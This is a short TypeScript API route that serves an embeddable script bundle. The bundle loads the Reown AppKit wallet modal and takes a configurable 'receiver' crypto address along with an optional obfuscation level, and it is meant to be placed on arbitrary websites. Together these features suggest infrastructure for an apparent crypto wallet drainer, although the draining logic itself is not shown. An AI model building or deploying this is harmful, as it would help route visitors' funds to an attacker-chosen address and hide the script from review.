import type { ObfuscationLevel } from "@/lib/obfuscator";
import { obfuscateScript } from "@/lib/obfuscator";
import { generateLiveSdkBundle } from "@/lib/live-compile-bundle";

/**
 * GET /api/sdk — CDN-style bundle from current dashboard (compile JSON + operational).
 * Loads Reown AppKit from jsDelivr inside the script when executed (modal = AppKit).
 *
 * Embed on any site:
 *   <script type="module" src="https://YOUR_DOMAIN/api/sdk"></script>
 * Optional receiver override:
 *   <script type="module" src="https://YOUR_DOMAIN/api/sdk?receiver=0x..."></script>
 */
export async function GET(request: Request) {
  const url = new URL(request.url);
  const receiver = url.searchParams.get("receiver")?.trim() || undefined;
  const obfLevel = (url.searchParams.get("obfuscate") || "none") as ObfuscationLevel;

  let sdkBundle = await generateLiveSdkBundle(receiver);

  if (obfLevel !== "none") {
    sdkBundle = await obfuscateScript(sdkBundle, obfLevel);
  }

  return new Response(sdkBundle, {
    headers: {
      "content-type": "application/javascript; charset=utf-8",
      "cache-control": "public, max-age=60, s-maxage=60",
      "access-control-allow-origin": "*",
    },
  });
}
